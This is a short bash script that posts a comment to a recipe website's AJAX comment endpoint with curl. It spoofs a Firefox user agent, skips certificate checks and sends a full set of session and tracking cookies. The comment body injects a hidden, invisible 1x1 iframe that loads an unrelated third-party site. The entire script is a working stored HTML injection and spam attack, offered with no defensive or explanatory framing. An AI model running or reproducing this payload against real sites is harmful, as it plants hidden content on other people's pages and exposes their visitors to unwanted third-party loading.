#!/bin/bash -e
curl -i -s -k  -X 'POST' \
    -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Referer: http://www.jarti.co/article-200' \
    -b '__cfduid=d47abecdea21482a12a155261e01fb3061443246701; HstCfa2917566=1443246660985; HstCla2917566=1443378422042; HstCmu2917566=1443246660985; HstPn2917566=6; HstPt2917566=34; HstCnv2917566=5; HstCns2917566=10; _ga=GA1.2.541312514.1443246658; _hjUserId=e9dab73c-08fb-329f-a0be-083750514efb; user=c912e67f3746d7d3e3525ba06fd62f65; _hjIncludedInSample=1; _gat=1; PHPSESSID=k7hcrfdgmal3gv4n30vvl2k9p5; bannedx=on' \
    --data-binary $'text=<iframe src=\"http://www.geographycollector.com\" style=\"display:none\" width=1 height=1>text list of cities</iframe>&recipe=200' \
    'http://www.jarti.co/ajax/add_comment_recipe.php'
